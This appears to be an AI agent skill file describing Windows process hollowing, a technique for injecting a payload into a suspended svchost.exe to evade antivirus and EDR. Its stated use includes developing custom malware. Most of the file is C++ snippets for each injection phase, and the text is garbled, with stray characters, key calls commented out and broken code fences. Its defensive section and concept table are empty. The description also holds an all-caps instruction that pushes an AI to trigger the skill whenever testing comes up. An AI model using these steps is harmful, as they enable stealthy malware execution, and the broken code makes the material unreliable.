---
name: process-hollowing
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Execute advanced evasion by injecting malicious code into the memory space of a legitimate, 
  suspended process (Process Hollowing). This skill details techniques to bypass static and 
  dynamic analysis by masking malicious activity behind trusted processes like svchost.exe or explorer.exe.
domain: cybersecurity
subdomain: red-teaming
category: Evasion
difficulty: expert
estimated_time: "4-6 hours"
mitre_attack:
  tactics: [TA0005, TA0004]
  techniques: [T1055.012]
platforms: [windows]
tags: [process-hollowing, evasion, red-teaming, memory-injection, malware-development, defense-evasion]
tools: [visual-studio, c++, x64dbg]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Process Hollowing

## When to Use
- When developing custom malware or establishing covert persistence during a red team engagement where standard executable drops are heavily monitored and blocked by AV/EDR.
- To execute unbacked payloads in memory covertly.

## Workflow

### Phase 1: Creation of a Suspended Legitimate Process

```cpp
# Concept: Windows API STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
ZeroMemory(&pi, sizeof(pi));
si.cb = sizeof(si);

// CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```

### Phase 2: Unmapping (Hollowing) the Original Code

```cpp
# typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

// NtUnmapViewOfSection(pi.hProcess, pBaseAddress); 
```

### Phase 3: Allocating Memory and Writing Payload

```cpp
# nimbly PVOID pNewBase = VirtualAllocEx(pi.hProcess, pBaseAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// WriteProcessMemory(pi.hProcess, pNewBase, pPayload, dwSize, NULL);
```

### Phase 4: Thread Resumption

```cpp
# CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread); // ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Create Suspended ] --> B{Injection Successful ]}
    B -->|Yes| C[Resume Thread ]
    B -->|No| D[Check Antivirus ]
    C --> E[Execution ]
```

## 🔵 Blue Team Detection & Defense
- **API Monitoring**: **Memory Scanning**: **EDR Heuristics**: Key Concepts
| Concept | Description |
|---------|-------------|
| Process Hollowing | |
| Memory Mapping | |
| Suspended Process | |

## References
- MITRE ATT&CK: [Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- Tenable: [Understanding Process Hollowing](https://www.tenable.com/blog/understanding-process-hollowing)
